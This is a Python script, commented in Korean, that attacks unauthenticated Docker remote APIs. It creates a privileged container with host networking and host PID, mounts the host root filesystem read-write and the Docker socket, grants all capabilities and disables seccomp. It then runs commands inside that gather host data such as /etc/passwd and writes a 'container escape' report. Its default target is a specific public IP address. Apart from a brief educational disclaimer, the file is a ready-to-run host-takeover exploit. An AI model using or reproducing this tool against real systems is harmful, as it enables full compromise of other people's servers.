import requests
import json
import time
import argparse
from datetime import datetime


class PrivilegedContainerCreator:
    def __init__(self, docker_host, port=2375):
        self.docker_host = docker_host
        self.port = port
        self.base_url = f"http://{docker_host}:{port}"
        self.session = requests.Session()
        self.session.timeout = 10

    def check_docker_api(self):
        """Docker API 접근 확인"""
        try:
            response = self.session.get(f"{self.base_url}/version")
            if response.status_code == 200:
                version_data = response.json()
                print(f"✓ Docker API 접근 성공")
                print(f"  Docker 버전: {version_data.get('Version', 'Unknown')}")
                print(f"  API 버전: {version_data.get('ApiVersion', 'Unknown')}")
                print(f"  OS: {version_data.get('Os', 'Unknown')}")
                print(f"  아키텍처: {version_data.get('Arch', 'Unknown')}")
                return True
            else:
                print(f"✗ Docker API 접근 실패: {response.status_code}")
                return False
        except Exception as e:
            print(f"✗ Docker API 접근 실패: {str(e)}")
            return False

    def list_existing_containers(self):
        """기존 컨테이너 목록 확인"""
        try:
            response = self.session.get(f"{self.base_url}/containers/json?all=true")
            if response.status_code == 200:
                containers = response.json()
                print(f"\n=== 기존 컨테이너 ({len(containers)}개) ===")
                for container in containers:
                    names = container.get('Names', ['Unknown'])
                    image = container.get('Image', 'Unknown')
                    status = container.get('Status', 'Unknown')
                    print(f"  {names[0]}: {image} - {status}")
                return containers
            return []
        except Exception as e:
            print(f"컨테이너 목록 조회 실패: {str(e)}")
            return []

    def pull_image(self, image="alpine:latest"):
        """이미지 다운로드"""
        print(f"\n=== 이미지 다운로드: {image} ===")
        try:
            response = self.session.post(f"{self.base_url}/images/create?fromImage={image}")
            if response.status_code == 200:
                print(f"✓ 이미지 다운로드 성공: {image}")
                return True
            else:
                print(f"이미지 다운로드 실패: {response.status_code}")
                return False
        except Exception as e:
            print(f"이미지 다운로드 실패: {str(e)}")
            return False

    def create_privileged_container(self, container_name="security-test-container2"):
        """특권 컨테이너 생성"""
        print(f"\n=== 특권 컨테이너 생성: {container_name} ===")

        # 컨테이너 구성
        container_config = {
            "Image": "alpine:latest",
            "Cmd": [
                "/bin/sh",
                "-c",
                "echo 'Privileged container started' && "
                "echo 'Host info:' && "
                "uname -a && "
                "echo 'Mounted filesystems:' && "
                "df -h && "
                "echo 'Network interfaces:' && "
                "ip addr show && "
                "echo 'Container running...' && "
                "tail -f /dev/null"
            ],
            "Env": [
                "CONTAINER_TYPE=privileged_test",
                "CREATED_BY=security_researcher"
            ],
            "WorkingDir": "/",
            "HostConfig": {
                "Privileged": True,  # 특권 모드
                "NetworkMode": "host",  # 호스트 네트워크
                "PidMode": "host",  # 호스트 PID 네임스페이스
                "Binds": [
                    "/:/host:rw",  # 호스트 루트 파일시스템 마운트
                    "/var/run/docker.sock:/var/run/docker.sock:rw",  # Docker 소켓
                    "/proc:/host/proc:rw",  # 호스트 proc 마운트
                    "/sys:/host/sys:rw"  # 호스트 sys 마운트
                ],
                "CapAdd": ["ALL"],  # 모든 권한 추가
                "SecurityOpt": ["seccomp:unconfined"]  # seccomp 비활성화
            }
        }

        try:
            # 컨테이너 생성
            response = self.session.post(
                f"{self.base_url}/containers/create?name={container_name}",
                json=container_config,
                headers={'Content-Type': 'application/json'}
            )

            if response.status_code == 201:
                container_data = response.json()
                container_id = container_data.get('Id')
                print(f"✓ 특권 컨테이너 생성 성공")
                print(f"  컨테이너 ID: {container_id[:12]}")
                print(f"  컨테이너 이름: {container_name}")

                # 컨테이너 시작
                start_response = self.session.post(f"{self.base_url}/containers/{container_id}/start")
                if start_response.status_code == 204:
                    print(f"✓ 컨테이너 시작 성공")
                    return container_id
                else:
                    print(f"✗ 컨테이너 시작 실패: {start_response.status_code}")

            else:
                print(f"✗ 컨테이너 생성 실패: {response.status_code}")
                if response.text:
                    print(f"  오류 내용: {response.text}")

        except Exception as e:
            print(f"✗ 컨테이너 생성 실패: {str(e)}")

        return None

    def execute_commands(self, container_id):
        """컨테이너에서 명령 실행 및 데이터 수집"""
        print(f"\n=== 시스템 정보 수집 ===")

        commands = [
            ("Host Information", "uname -a"),
            ("User Accounts", "cat /host/etc/passwd | head -10"),
            ("Running Processes", "ps aux | head -15"),
            ("Network Connections", "netstat -tuln | head -10"),
            ("Disk Usage", "df -h"),
            ("Memory Information", "cat /host/proc/meminfo | head -8"),
            ("Docker Processes", "ps aux | grep docker"),
            ("Host Filesystem", "ls -la /host/"),
            ("Network Interfaces", "ip addr show | head -20"),
            ("System Services", "systemctl list-units --type=service --state=running | head -10")
        ]

        collected_data = {}

        for desc, cmd in commands:
            print(f"\n--- {desc} ---")
            output = self._exec_command(container_id, cmd)
            if output:
                collected_data[desc] = output
                print(output[:200] + "..." if len(output) > 200 else output)

        return collected_data

    def _exec_command(self, container_id, command):
        """개별 명령 실행"""
        try:
            # exec 생성
            exec_config = {
                "AttachStdout": True,
                "AttachStderr": True,
                "Cmd": ["/bin/sh", "-c", command]
            }

            exec_response = self.session.post(
                f"{self.base_url}/containers/{container_id}/exec",
                json=exec_config,
                headers={'Content-Type': 'application/json'}
            )

            if exec_response.status_code == 201:
                exec_id = exec_response.json().get('Id')

                # exec 시작
                start_response = self.session.post(
                    f"{self.base_url}/exec/{exec_id}/start",
                    json={"Detach": False, "Tty": False},
                    headers={'Content-Type': 'application/json'}
                )

                if start_response.status_code == 200:
                    output = start_response.text.strip()
                    return output if output else "(No output)"
                else:
                    return f"Command failed: {start_response.status_code}"

        except Exception as e:
            return f"Command error: {str(e)}"

        return "(No output)"

    def generate_report(self, container_id, container_name, collected_data=None):
        """보고서 생성"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        report = f"""# Docker API Container Escape Analysis

## Target Information
- Host: {self.docker_host}:{self.port}
- Timestamp: {timestamp}
- Container ID: {container_id[:12] if container_id else 'N/A'}
- Container Name: {container_name}

## Container Configuration
- Privileged: Enabled
- Network Mode: Host
- PID Mode: Host
- Filesystem Mount: / -> /host (rw)
- Docker Socket: Accessible
- Security: All capabilities, no seccomp

## System Information Collected"""

        if collected_data:
            for category, data in collected_data.items():
                report += f"\n### {category}\n```\n{data}\n```\n"

        report += f"""
## Impact Assessment
- Complete host system access achieved
- Container escape successful
- Network isolation bypassed
- Process isolation compromised

## Mitigation
- Disable external Docker API exposure
- Implement TLS authentication
- Apply network access controls
- Regular security audits

## Research Note
This demonstration illustrates Docker API misconfiguration vulnerabilities for educational purposes.
"""

        filename = f"docker_escape_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)

        print(f"\n보고서 생성: {filename}")
        return filename


def main():
    parser = argparse.ArgumentParser(description='Create Privileged Container via Docker API')
    parser.add_argument('--host', default='43.202.78.16', help='Docker host IP')
    parser.add_argument('--port', type=int, default=2375, help='Docker API port')
    parser.add_argument('--name', default='security-test-container2', help='Container name')
    parser.add_argument('--no-exec', action='store_true', help='Skip command execution')

    args = parser.parse_args()

    print("Docker API 특권 컨테이너 생성 도구")
    print("=" * 50)
    print(f"대상: {args.host}:{args.port}")
    print("경고: 이 도구는 보안 테스트 목적으로만 사용하세요!")

    # 사용자 확인
    confirm = input("\n계속 진행하시겠습니까? (yes/no): ")
    if confirm.lower() != 'yes':
        print("작업이 취소되었습니다.")
        return

    # 컨테이너 생성 실행
    creator = PrivilegedContainerCreator(args.host, args.port)

    # 1. Docker API 확인
    if not creator.check_docker_api():
        print("Docker API에 접근할 수 없습니다.")
        return

    # 2. 기존 컨테이너 확인
    creator.list_existing_containers()

    # 3. 이미지 다운로드
    creator.pull_image()

    # 4. 특권 컨테이너 생성
    container_id = creator.create_privileged_container(args.name)

    if container_id:
        print(f"\n✓ 특권 컨테이너 생성 완료!")
        print(f"  컨테이너 ID: {container_id[:12]}")

        # 5. 명령 실행 및 데이터 수집 (옵션)
        collected_data = None
        if not args.no_exec:
            time.sleep(2)  # 컨테이너 시작 대기
            collected_data = creator.execute_commands(container_id)

        # 6. 보고서 생성
        creator.generate_report(container_id, args.name, collected_data)

        print(f"\n컨테이너 접근 방법:")
        print(f"docker -H {args.host}:{args.port} exec -it {args.name} /bin/sh")
    else:
        print("\n✗ 특권 컨테이너 생성 실패")


if __name__ == "__main__":
    main()